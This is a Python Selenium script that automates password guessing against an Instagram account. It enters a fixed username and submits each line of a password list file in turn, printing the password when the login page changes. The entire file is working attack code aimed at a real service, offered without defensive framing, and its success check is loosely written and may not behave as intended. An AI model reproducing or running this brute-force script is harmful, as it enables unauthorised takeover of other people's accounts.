from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from time import sleep


PATH="C:/Users/Acer/Downloads/chromedriver_win32/chromedriver.exe"
rthacks=webdriver.Chrome(PATH)
rthacks.get('https://www.instagram.com/accounts/login/')

sleep(3)
username = rthacks.find_element_by_name('username')

username.send_keys('linuxlover127001')

password = rthacks.find_element_by_name('password')
passfile=open('pass.txt','r')
def display(a):
	print("log in password"+a)
for i in passfile:
	try:
		password.send_keys(i)
		submit = rthacks.find_element_by_tag_name("form")
		submit.submit()
		c=rthacks.current_url
		sleep(1)
		b=rthacks.find_element_by_xpath("//button[contains(text(), 'Not Now')]")
		b.click()
		sleep(1)
		c=rthacks.current_url
	except NoSuchElementException:
		password.send_keys(Keys.CONTROL,"a",Keys.DELETE)
		sleep(1)
		url2=rthacks.current_url
if c!=url2:
	display(i)